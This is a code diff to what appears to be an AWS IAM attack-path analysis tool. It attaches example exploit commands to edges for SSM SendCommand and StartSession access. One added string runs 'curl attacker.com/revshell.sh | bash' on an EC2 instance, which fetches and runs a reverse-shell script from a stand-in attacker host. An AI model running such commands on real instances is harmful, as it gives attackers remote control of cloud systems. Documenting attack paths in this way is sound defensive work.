@@ -97,7 +97,10 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                 reason = 'can call ssm:SendCommand to access an EC2 instance with access to'
                 if mfa_res_1:
                     reason = '(Requires MFA) ' + reason
-                result.append(Edge(node_source, node_destination, reason, 'SSM'))
+                exploit_cmds = [
+                    'aws ssm send-command --instance-ids <instance-id> --document-name "AWS-RunShellScript" --parameters commands=["curl attacker.com/revshell.sh | bash"] --profile attacker'
+                ]
+                result.append(Edge(node_source, node_destination, reason, 'SSM', exploit_cmds))
 
             sesh_auth_res, mfa_res_2 = query_interface.local_check_authorization_handling_mfa(
                 node_source,
@@ -110,6 +113,9 @@ def generate_edges_locally(nodes: List[Node], scps: Optional[List[List[dict]]] =
                 reason = 'can call ssm:StartSession to access an EC2 instance with access to'
                 if mfa_res_2:
                     reason = '(Requires MFA) ' + reason
-                result.append(Edge(node_source, node_destination, reason, 'SSM'))
+                exploit_cmds = [
+                    'aws ssm start-session --target <instance-id> --profile attacker'
+                ]
+                result.append(Edge(node_source, node_destination, reason, 'SSM', exploit_cmds))
 
     return result
